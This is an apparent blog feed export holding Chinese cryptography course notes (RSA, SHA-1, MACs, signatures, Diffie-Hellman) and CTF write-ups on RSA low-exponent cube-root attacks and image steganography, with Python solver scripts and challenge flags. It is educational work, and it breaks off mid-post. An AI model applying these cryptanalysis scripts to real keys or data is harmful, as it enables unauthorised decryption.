(𝑐)表示用解密算法D和秘密密钥SK<sub>A</sub>对密文c进行解密。</p><p>由于<strong>只有接收者A有解密密钥</strong>，故密文c在公共信道的传输过程中是安全的。</p><h3 id="RSA密码算法"><a href="#RSA密码算法" class="headerlink" title="RSA密码算法"></a>RSA密码算法</h3><h4 id="密钥的产生"><a href="#密钥的产生" class="headerlink" title="密钥的产生"></a>密钥的产生</h4><p>① 选择两个满足需要的大素数p和q，计算<strong>n=p×q,φ(n)= (p-1)×(q-1)</strong>，其中φ(n)是n的欧拉函数值。<br>② 选一个整数e,满足1&lt;e&lt;φ(n)，且gcd(φ(n),e)=1。通过<strong>d×e≡1modφ(n)</strong>，计算出d。<br>③ 以&#123;e,n&#125;为公开密钥，&#123;d,n&#125;为秘密密钥。<br>假设Alice是秘密消息的接收方，则只有Alice知道秘密密钥&#123;d,n&#125;，所有人都可以知道公开密钥&#123;e,n&#125;。</p><h4 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h4><p>如果想发送消息m给Alice，就选择Alice的公钥&#123;e,n&#125;，然后计算：$c≡m^e mod n$，然后把c发送给Alice。</p><h4 id="解密-1"><a href="#解密-1" class="headerlink" title="解密"></a>解密</h4><p>接收方Alice收到c，用私钥计算：$m≡c^dmodn$</p><p><img src="/2018/09/06/密码学/1526955463464.png" alt="Alt text"></p><ul><li><strong>能够抵御选择明文攻击</strong></li><li><strong>RSA的安全性基于分解大整数难题</strong></li></ul><p>（1）不同的用户不能用相同的模数n. 大素数的个数是十分庞大的资源，不用担心会被用完。<br>（2）p与q的差值要大<br>（3）p-1和q-1都应有大的素因子。<br>（4）私钥d的选择。如果私钥d的值比较小，由RSA的解密算法可知，对数据进行解密的速度越快。但是，私钥d的值不能太小，一般要求d≥n1/4。<br>（5）更换密钥<br>如果私钥d被泄露，则在模n的情况下重新计算一对密钥是不够的，而是必须选择一个新的公钥n.<br>（6）e不可太小，否则不安全。                              </p><h2 id="第七章"><a href="#第七章" class="headerlink" title="第七章"></a>第七章</h2><h3 id="Hash函数"><a href="#Hash函数" class="headerlink" title="Hash函数"></a>Hash函数</h3><p>Hash函数H是一公开函数，不需要密钥，用于将任意长的消息m映射为较短的、固定长度的一个值𝐻(𝑚)<br><img src="/2018/09/06/密码学/1526957776564.png" alt="Alt text"><br>要求：1.接收任意长度的消息输入 2.生成较短的固定长度输出 3.容易快速的计算出哈希值<br>安全性：<br>（1）<strong>单向性</strong>：由消息的哈希值倒推出消息在计算上不可行，即给定𝐻(𝑚)，计算m计算上不可行；<br>（2）<strong>抗弱碰撞性</strong>：对于任何给定消息及其哈希值，不可能找到另一个能映射出该哈希值的消息，即给定的𝐻(𝑚)，很难找到一个$𝑚≠𝑚^′$使得$𝐻(𝑚)=𝐻(𝑚^′)$；<br>（3）<strong>抗强碰撞性</strong>: 对于任何两个不同的消息，它们的哈希值必定不同，很难找到两条消息m和$𝑚^′$，使得$𝐻(𝑚)=𝐻(𝑚^′)$。</p><h3 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h3><p>消息摘要长度为128bits</p><h3 id="SHA-1"><a href="#SHA-1" class="headerlink" title="SHA-1"></a>SHA-1</h3><p>SHA-1接受输入消息的最大长度为2<sup>64</sup>-1 bits，生成160 bits的消息摘要。<br><img src="/2018/09/06/密码学/1526960251320.png" alt="Alt text"><br>包含四轮运算，每一轮20回合，总共80回合</p><p>（1）填充消息<br>输入消息M，首先应该填充消息，保证输入SHA-1计算的整个消息长度是<strong>512 bits的倍数</strong>。<br>第一个比特位填‘1’，其余全部填‘0’</p><p>假设消息M的长度为 𝑙 bits，在原始消息M尾部增加1个比特位”1”和𝑘个”0” 比特位，𝑙和𝑘满足<br>𝒍+𝟏+𝒌≡𝟒𝟒𝟖(𝐦𝐨𝐝 𝟓𝟏𝟐)，<br>并且k为最小的非负整数。然后再在填充消息的末尾添加64-bit的块，该64-bit块是原始消息比特位长度变换为二进制块，如果消息长度变换为二进制块的位的个数小于64，则在左边补0，使得块的长度刚好等于64 bits。</p><p><strong>最后16bits为消息长度值</strong> 看例题</p><p>（2）被填充消息分组<br>把填充后的整个消息按照<strong>512-bit</strong>块进行划分，假若划分为N个512-bit块，依次为：𝑀<sup>(0)</sup>,𝑀<sup>(1)</sup>,⋯,𝑀<sup>(N-1)</sup>。</p><p>每个512-bit块又由<strong>16个32-bit</strong>字组成，第i个512-bit块的第一个32-bit 字，记为𝑀<sub>0</sub><sup>(𝑖)</sup>，第二个32-bit字，记为𝑀<sub>1</sub><sup>(𝑖)</sup>，16个32-bit字依次𝑀<sub>0</sub><sup>(𝑖)</sup>𝑀<sub>1</sub><sup>(𝑖)</sup>,⋯,𝑀<sub>15</sub><sup>(𝑖)</sup>。</p><p>（3）数据扩展<br><img src="/2018/09/06/密码学/1526960939921.png" alt="Alt text"><br><img src="/2018/09/06/密码学/1526960958946.png" alt="Alt text"></p><p>（4）初始化变量<br>SHA-1的初值变量IV为160 bits的数据块，即5个32-bit的字，依次为𝐻<sub>0</sub><sup>(0)</sup>, 𝐻<sub>1</sub><sup>(0)</sup>,𝐻<sub>2</sub><sup>(0)</sup>),𝐻<sub>3</sub><sup>(0)</sup>, 𝐻<sub>4</sub><sup>(0)</sup>,初值变量设置为：<br><img src="/2018/09/06/密码学/1526961195291.png" alt="Alt text"></p><h3 id="基于分组的CBC-MAC"><a href="#基于分组的CBC-MAC" class="headerlink" title="基于分组的CBC-MAC"></a>基于分组的CBC-MAC</h3><p>大多数消息认证码都是基于分组密码，它们有相对较短比特长度或短密码（如基于DES-CBC的MAC是56 bits），MAC函数与加密算法类似，不同之处为<strong>MAC函数不必是可逆的</strong>，因此与加密算法相比更不易被攻破，提供足够安全。<br><strong>CBC-MAC</strong>算法是<strong>最常用</strong>的一种基于分组的MAC算法<img src="/2018/09/06/密码学/1526974114969.png" alt="Alt text"><br>其初始变量 取值为零，然后把需要认证的数据 进行分组，分组的长度由所选的分组密码算法所决定，若最后一组数据不够分组规定长度，则需要进行必要的填充，最简单填充方法在其后补零.</p><h3 id="消息认证"><a href="#消息认证" class="headerlink" title="消息认证"></a>消息认证</h3><p>基于消息认证码的认证过程，前提条件是通信双方共享一密钥K。<br><img src="/2018/09/06/密码学/1526974282002.png" alt="Alt text"><br>存在的问题：掌握密钥的人否认</p><h2 id="第八章"><a href="#第八章" class="headerlink" title="第八章"></a>第八章</h2><h3 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h3><p>数字签名是在密码学理论的基础上发展起来的，基于公钥密码体制和私钥密码体制都可以获得数字签名，每种签名方案都与某一种或多种密码体制紧密联系在一起。目前<strong>主要集中在基于公钥密码体制</strong>的数字签名技术的研究。<strong>多以非对称密码体制</strong>为基础提出数字签名方案。</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>RSA算法中，一个私钥&#123;d, n&#125;只有唯一的&#123;e, n&#125;与之对应。&#123;e, n&#125;表示了秘密密钥&#123;d, n&#125;的持有者的身份。<br>让消息发布者Bob先计算s≡m<sup>d</sup> mod n，然后把s附于消息m之后即&#123;m, s&#125;一起放到公共媒介上。<br>可以通过计算m≡s<sup>e</sup> mod n成立与否，来判定消息是不是Bob发布的消息，以及消息是否被篡改。</p><h4 id="分类-1"><a href="#分类-1" class="headerlink" title="分类"></a>分类</h4><p>按数字签名的所依赖的理论基础分，主要可以分为：<br>（1）基于<strong>大数分解难题</strong>的数字签名，如8.3.1节<strong>RSA</strong>数字签名方案；<br>（2）基于<strong>离散对数难题</strong>的数字签名，如8.3.2节介绍的<strong>ElGamal</strong>数字签名方案，8.4.1和8.4.3节介绍的美国的数字签名方案；<br>（3）基于<strong>椭圆曲线离散对数</strong>的数字签名，这类签名往往由基于离散对数的数字签名改进而来,如8.4.2节、8.4.4节和8.4.5节介绍的数字签名方案。<br>数字签名的用途分，可以把数字签名分为普通的数字签名和特殊用途的数字签名。</p><h3 id="RSA数字签名算法"><a href="#RSA数字签名算法" class="headerlink" title="RSA数字签名算法"></a>RSA数字签名算法</h3><p>（1）参数产生<br>①选择两个满足需要的大素数p和q，计算n=p×q, φ(n)= (p-1)×(q-1)，其中φ(n)是n的欧拉函数值。<br>②选一个整数e, 满足1&lt;e&lt;φ(n)，且gcd(φ(n),e)=1。通过d×e≡1modφ(n)，计算出d。<br>③以&#123;e,n&#125;为公开密钥，&#123;d,n&#125;为秘密密钥。<br>（2）签名过程<br>假设签名者为Bob，则只有Bob知道秘密密钥&#123;d, n&#125;。<br>设需要签名的消息为m，则签名者Bob通过如下计算对m签名：s≡md mod n<br>（m, s）为对消息m的签名。Bob在公共媒体上宣称他发布了消息m，同时把对m的签名s置于消息后用于公众验证签名。<br>（3）验证过程。<br>公众在看到消息m和对其签名s后，利用Bob的公开验证密钥&#123;e, n&#125;对消息进行验证。公众计算：m≡s<sup>e</sup> mod n是否成立，若成立，则Bob的签名有效。公众认为消息m的确是Bob所发布，且消息内容没有被篡改。也就是说，公众可以容易鉴别发布人发布的消息的完整性。</p><ul><li><strong>RSA加密算法:公钥加密，私钥解密</strong></li><li><strong>RSA签名算法:私钥签名，公钥验证</strong><h3 id="改进算法"><a href="#改进算法" class="headerlink" title="改进算法"></a>改进算法</h3><strong>公开的安全哈希函数为H(·)</strong>，签名算法的参数选择如前所述，改进后签名方案的签名过程和验证过程如下：<br>（1）签名过程<br>设需要签名的消息为m，签名者Bob通过如下计算完成签名：s≡H(m)<sup>d</sup> mod n<br>（m, s）为对消息m的签名。</li></ul><p>（2）验证过程<br>在收到消息m和签名s后，验证H(m)≡s<sup>e</sup> mod n 是否成立。若成立，则签名有效。</p><p>通过使用哈希函数，有效防止了对签名的伪造，增强了签名算法的安全性，这也是在很多签名算法中使用哈希函数的原因之一。</p><h2 id="第九章"><a href="#第九章" class="headerlink" title="第九章"></a>第九章</h2><h3 id="认证协议"><a href="#认证协议" class="headerlink" title="认证协议"></a>认证协议</h3><p>所谓协议（Protocol），就是两个或两个以上的参与者为完成某项特定的任务而采取的一系列步骤，这个定义包含3层含义：<br>第一，协议自始自终是有序的过程，每一步必须依次执行，在前一步没有完成之前，后面的步骤不可能被执行；<br>第二，协议至少需要两个参与者，一个人可以通过执行一系列的步骤来完成某项任务，但它构不成协议；<br>第三，通过执行协议必须能够完成某项任务，即使某些东西看似协议，但没有完成任何任务，也不能成为协议，只不过是浪费时间的空操作。</p><h4 id="单向认证"><a href="#单向认证" class="headerlink" title="单向认证"></a>单向认证</h4><h5 id="需要第三方参与的单向认证"><a href="#需要第三方参与的单向认证" class="headerlink" title="需要第三方参与的单向认证"></a>需要第三方参与的单向认证</h5><p><img src="/2018/09/06/密码学/1526959048344.png" alt="Alt text"></p><p>采用对称密码技术，第三方通常为KDC密钥分发中心，AS认证服务器</p><h5 id="无需第三方参与的单向认证"><a href="#无需第三方参与的单向认证" class="headerlink" title="无需第三方参与的单向认证"></a>无需第三方参与的单向认证</h5><p><img src="/2018/09/06/密码学/1526959151737.png" alt="Alt text"></p><h4 id="双向认证"><a href="#双向认证" class="headerlink" title="双向认证"></a>双向认证</h4><p>在双向认证过程中，通信双方需要互相认证各自的身份，然后交换会话密钥<br><img src="/2018/09/06/密码学/1526959220694.png" alt="Alt text"></p><h2 id="第十章"><a href="#第十章" class="headerlink" title="第十章"></a>第十章</h2><h3 id="密钥组织结构"><a href="#密钥组织结构" class="headerlink" title="密钥组织结构"></a>密钥组织结构</h3><p><img src="/2018/09/06/密码学/1526970146207.png" alt="Alt text"><br><strong>使用n级密钥K<sub>n</sub>通过算法 f<sub>n</sub>保护明文数据</strong><br><strong>主密钥</strong>K<sub>1</sub>是整个密钥管理系统的核心<br>最下层K<sub>n</sub>叫<strong>工作密钥</strong></p><h3 id="密钥分类"><a href="#密钥分类" class="headerlink" title="密钥分类"></a>密钥分类</h3><ul><li>基本密钥（初始密钥或用户密钥）：可以在保留较长时间</li><li>会话秘钥（数据加密密钥）：又叫工作密钥，一般是动态的，使用完后立即清除，一次一密</li><li>密钥加密密钥：二级密钥</li><li>主密钥 </li></ul><h3 id="DH密钥交换协议"><a href="#DH密钥交换协议" class="headerlink" title="DH密钥交换协议"></a>DH密钥交换协议</h3><p>Diffie-Hellman算法的<strong>惟一目的</strong>就是使两个用户能安全地交换密钥，从而得到一个共享的会话密钥（秘密密钥）。需要注意的是<strong>该算法本身不能用于加、解密</strong>。</p><p><strong>算法的安全性是基于Zp上的离散对数问题。</strong></p><h4 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h4><p>（1）用户A选取一个大的随机数r<sub>A</sub>(0&lt; r<sub>A</sub> &lt;p-2 )，计算𝑆<sub>𝐴</sub>=𝑎<sup>𝑟<sub>𝐴</sub> </sup> (𝑚𝑜𝑑𝑝) ，并且把 𝑆<sub>𝐴</sub>发送给用户B。<br>（2）用户B选取一个随机数 r<sub>B</sub>(0&lt; r<sub>B </sub>&lt;p-2 ) ，计算𝑆<sub>B</sub>=𝑎<sup>𝑟<sub>B</sub> </sup> (𝑚𝑜𝑑𝑝)  。并且把 𝑆<sub>B</sub>发送给用户A。<br>（3）用户A计算 <strong>K=S<sub>B</sub><sup>r<sub>A</sub></sup> (𝑚𝑜𝑑𝑝)</strong>，用户B计算<strong>K’=S<sub>A</sub><sup>r<sub>B</sub></sup> (𝑚𝑜𝑑𝑝)</strong><br><strong>K=a<sup>r<sub>A</sub>r<sub>B</sub></sup> (𝑚𝑜𝑑𝑝)</strong> </p><p><strong>计算时使用欧拉定理和模重复平方剩余定理简化计算</strong></p><h4 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h4><p><img src="/2018/09/06/密码学/1526975077622.png" alt="Alt text"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;密码学&quot;&gt;&lt;a href=&quot;#密码学&quot; class=&quot;headerlink&quot; title=&quot;密码学&quot;&gt;&lt;/a&gt;密码学&lt;/h1&gt;&lt;h2 id=&quot;第一章&quot;&gt;&lt;a href=&quot;#第一章&quot; class=&quot;headerlink&quot; title=&quot;第一章&quot;&gt;&lt;/a&gt;第一章&lt;/h
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="https://www.twosmi1e.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Crypto中RSA题目总结</title>
    <link href="https://www.twosmi1e.com/2018/08/18/Crypto%E4%B8%ADRSA%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93/"/>
    <id>https://www.twosmi1e.com/2018/08/18/Crypto中RSA题目总结/</id>
    <published>2018-08-18T11:50:19.000Z</published>
    <updated>2018-09-03T11:51:51.210Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-RSA算法简述"><a href="#0x00-RSA算法简述" class="headerlink" title="0x00 RSA算法简述"></a>0x00 RSA算法简述</h3><hr><h4 id="密钥的产生"><a href="#密钥的产生" class="headerlink" title="密钥的产生"></a>密钥的产生</h4><p>① 选择两个满足需要的大素数p和q，计算<strong>n=p×q,φ(n)= (p-1)×(q-1)</strong>，其中φ(n)是n的欧拉函数值。<br>② 选一个整数e,满足1&lt;e&lt;φ(n)，且gcd(φ(n),e)=1。通过<strong>d×e≡1modφ(n)</strong>，计算出d。<br>③ 以{e,n}为公开密钥，{d,n}为秘密密钥。<br>假设Alice是秘密消息的接收方，则只有Alice知道秘密密钥{d,n}，所有人都可以知道公开密钥{e,n}。</p><h4 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h4><p>如果想发送消息m给Alice，就选择Alice的公钥{e,n}，然后计算：$c≡m^e mod n$，然后把c发送给Alice。</p><h4 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h4><p>接收方Alice收到c，用私钥计算：$m≡c^dmodn$</p><p><img src="/2018/08/18/Crypto中RSA题目总结/1526955463464.png" alt="Alt text"></p><ul><li><strong>能够抵御选择明文攻击</strong></li><li><strong>RSA的安全性基于分解大整数难题</strong></li></ul><p>（1）不同的用户不能用相同的模数n. 大素数的个数是十分庞大的资源，不用担心会被用完。<br>（2）p与q的差值要大<br>（3）p-1和q-1都应有大的素因子。<br>（4）私钥d的选择。如果私钥d的值比较小，由RSA的解密算法可知，对数据进行解密的速度越快。但是，私钥d的值不能太小，一般要求d≥n1/4。<br>（5）更换密钥<br>如果私钥d被泄露，则在模n的情况下重新计算一对密钥是不够的，而是必须选择一个新的公钥n.<br>（6）e不可太小，否则不安全。</p><h3 id="0x01-数据处理"><a href="#0x01-数据处理" class="headerlink" title="0x01 数据处理"></a>0x01 数据处理</h3><hr><p>基本上来说，RSA的题目都是围绕着c，m，e，d，n，p，q这几个参数展开的，但是题目一般不会直接给这种样子的参数，而是通过别的方式给出，这里就需要我们使用一些工具或者自己手工将这些参数提取出来。</p><p>pem文件：针对此类文件可以直接使用openssl提取，大概使用过的方式有：</p> <figure class="highlight plain"><figcaption><span>rsautl -encrypt -in FLAG -inkey public.pem -pubin -out flag.enc```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">```openssl   rsa -pubin -text -modulus -in warmup -in public.pem</span><br></pre></td></tr></table></figure><p>pcap文件：针对此类文件可以使用wireshark follow一下。这种问题一般都是写了一个交互的crypto系统，所以可能产生多轮交互。</p><p>PPC模式：这种模式是上述pcap文件的交互版，会给一个端口进行一些crypto的交互，参数会在交互中给出。</p><h3 id="0x02-模数分解"><a href="#0x02-模数分解" class="headerlink" title="0x02 模数分解"></a>0x02 模数分解</h3><p>  解决RSA题目最简单，最暴力，最好使的方法就是分解模数n。拿到题目先尝试能否将n分解成功，若成功得到p，q的取值，那么可求n的欧拉函数的值。</p><p>$$ varphi(n)=(p-1)(q-1) $$</p><h3 id="0x03-低加密指数攻击"><a href="#0x03-低加密指数攻击" class="headerlink" title="0x03 低加密指数攻击"></a>0x03 低加密指数攻击</h3><h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>e又被称为加密指数，选取小一点的e可以缩短加密时间，但是选取不当的话，就会造成安全问题。</p><p><strong>推荐在e=3时首先尝试此方法</strong></p><p>当e=3时，如果明文过小，导致明文的三次方仍然小于n，那么通过直接对密文三次开方，即可得到明文。</p><p>如果e=3，且$ m^e&lt;{n} $，那么$ c= m^e,$ $e=3$，即：<br>$$ m = sqrt[3]{c} $$<br>如果明文的三次方比n大，但是不是足够大，那么设k，有：</p><p>$$ c= m^e+kn $$</p><p>爆破k，如果$ c-kn $能开三次根式，那么可以直接得到明文。</p><h4 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h4><blockquote><p>安恒月赛<br>e = 3<br>n=0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793L<br>c=0x10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365</p></blockquote><h5 id="解密脚本"><a href="#解密脚本" class="headerlink" title="解密脚本"></a>解密脚本</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2 </span><br><span class="line"></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">n = <span class="number">0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793L</span></span><br><span class="line">c = <span class="number">0x10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'n='</span>, n</span><br><span class="line"><span class="keyword">print</span> <span class="string">'c='</span>, c</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">result = gmpy2.iroot(c, <span class="number">3</span>)</span><br><span class="line"><span class="keyword">print</span> result</span><br><span class="line"><span class="keyword">print</span> (<span class="string">'&#123;:x&#125;'</span>.format(result[<span class="number">0</span>])).decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure><p><img src="/2018/08/18/Crypto中RSA题目总结/1533317716345.png" alt="Alt text"></p><p><strong>gmpy2.iroot(m, n)函数</strong>：获取m开n次方的结果，返回一个tuple，第一个数为结果，第二个数为是否为整数的布尔值。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x00-RSA算法简述&quot;&gt;&lt;a href=&quot;#0x00-RSA算法简述&quot; class=&quot;headerlink&quot; title=&quot;0x00 RSA算法简述&quot;&gt;&lt;/a&gt;0x00 RSA算法简述&lt;/h3&gt;&lt;hr&gt;
&lt;h4 id=&quot;密钥的产生&quot;&gt;&lt;a href=&quot;#密钥的
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://www.twosmi1e.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>CTF中遇到的隐写术总结</title>
    <link href="https://www.twosmi1e.com/2018/08/03/CTF%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E9%9A%90%E5%86%99%E6%9C%AF%E6%80%BB%E7%BB%93/"/>
    <id>https://www.twosmi1e.com/2018/08/03/CTF中遇到的隐写术总结/</id>
    <published>2018-08-02T17:05:33.000Z</published>
    <updated>2018-10-11T07:52:33.768Z</updated>
    
    <content type="html"><![CDATA[<h2 id="图片隐写"><a href="#图片隐写" class="headerlink" title="图片隐写"></a>图片隐写</h2><h3 id="F5隐写"><a href="#F5隐写" class="headerlink" title="F5隐写"></a>F5隐写</h3><blockquote><p>安恒杯月赛</p></blockquote><p>题目提示浏览图片的时候能不能F5刷新呢？</p><ol><li>GitHub上的现成工具：git clone <a href="https://github.com/matthewgao/F5-steganography" target="_blank" rel="external">https://github.com/matthewgao/F5-steganography</a></li><li>进入F5_steganography目录 java Extract 图片文件路径 -p password<br><img src="/2018/08/03/CTF中遇到的隐写术总结/1532189155771.png" alt="Alt text"></li></ol><p>然后会出现一个flag.txt但是打开为乱码<br><img src="/2018/08/03/CTF中遇到的隐写术总结/1532189279386.png" alt="Alt text"><br><img src="/2018/08/03/CTF中遇到的隐写术总结/1532189344861.png" alt="Alt text"><br>看文件头是zip 看后缀名解压拿flag<br>flag{96efd0a2037d06f34199e921079778ee}</p><h3 id="xor隐写"><a href="#xor隐写" class="headerlink" title="xor隐写"></a>xor隐写</h3><blockquote><p>巅峰极客 loli</p></blockquote><p>hint:0xFF 想到用0xFF异或整个文件<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'./1.png'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f, open(<span class="string">'xor.png'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> wf:</span><br><span class="line">        <span class="keyword">for</span> each <span class="keyword">in</span> f.read():</span><br><span class="line">            wf.write(chr(ord(each) ^ <span class="number">0xff</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    xor()</span><br></pre></td></tr></table></figure></p><p>得到新的png文件，用hex看文件有提示<br><img src="/2018/08/03/CTF中遇到的隐写术总结/1532268180784.png" alt="Alt text"><br>将png分离出来可以用foremost或者直接修改16进制文件<br><img src="/2018/08/03/CTF中遇到的隐写术总结/00006777.png" alt="Alt text"><br>观察png文件，可以看到色块分为11列，每列隔行的色块永远是黑色，这说明应该横向读取图片，而列中的横长条由8个小色块组成，显然其代表的是一个字节的数据。<br>提取信息<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.image <span class="keyword">as</span> mpimg</span><br><span class="line"></span><br><span class="line">res_str = []</span><br><span class="line">res = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">readpng</span><span class="params">()</span>:</span></span><br><span class="line">    png = mpimg.imread(<span class="string">'./00006777.png'</span>)</span><br><span class="line">    yy, xx, depth = png.shape</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(yy):</span><br><span class="line">        <span class="keyword">if</span> y % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>, xx - <span class="number">1</span>, <span class="number">9</span>):</span><br><span class="line">                _str = <span class="string">"0b"</span> + str(int(png[y][x][<span class="number">0</span>])) + str(int(png[y][x + <span class="number">1</span>][<span class="number">0</span>])) + str(int(png[y][x + <span class="number">2</span>][<span class="number">0</span>])) + str(int(png[y][x + <span class="number">3</span>][<span class="number">0</span>])) + str(int(png[y][x + <span class="number">4</span>][<span class="number">0</span>])) + str(int(png[y][x + <span class="number">5</span>][<span class="number">0</span>])) + str(int(png[y][x + <span class="number">6</span>][<span class="number">0</span>])) + str(int(png[y][x + <span class="number">7</span>][<span class="number">0</span>]))</span><br><span class="line">                res_str.append(_str)</span><br><span class="line">                res.append(bin2hex(_str))</span><br><span class="line">    <span class="keyword">print</span> res_str</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'res.bin'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> each <span class="keyword">in</span> res:</span><br><span class="line">            f.write(chr(each))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bin2hex</span><span class="params">(_bin=<span class="string">"0b101"</span>)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> int(_bin, <span class="number">2</span>) ^ <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    readpng()</span><br></pre></td></tr></table></figure></p><p>打开就能看到flag<br><img src="/2018/08/03/CTF中遇到的隐写术总结/1532272225449.png" alt="Alt text"><br>flag{e0754197-e3ab-4d0d-b98f-96174c378a34}</p><h3 id="LSB隐写"><a href="#LSB隐写" class="headerlink" title="LSB隐写"></a>LSB隐写</h3><blockquote><p>巅峰极客 warmup</p></blockquote><p>判断方法大概就是用Stegsolve打开看red plane 0,blue plane 0, green plane 0是不是大致相同，如果是那多半是LSB隐写</p><p>分别提取红绿蓝三个通道的最低位<br><img src="/2018/08/03/CTF中遇到的隐写术总结/1532272546074.png" alt="Alt text"><br><img src="/2018/08/03/CTF中遇到的隐写术总结/1532272557239.png" alt="Alt text"><br><img src="/2018/08/03/CTF中遇到的隐写术总结/1532272567977.png" alt="Alt text"><br>分别是ook 和brainfuck编码 然后解码拼一起就完事<br>flag{db640436-7839-4050-8339-75a972fc553c}</p><blockquote><p>安恒月赛 女神</p></blockquote><p>题目提示弱口令，会误以为压缩包密码为弱口令，结果是隐写口令为弱口令</p><p>打开压缩包发现有密码，旁边有备注<br><img src="/2018/08/03/CTF中遇到的隐写术总结/1532352386718.png" alt="Alt 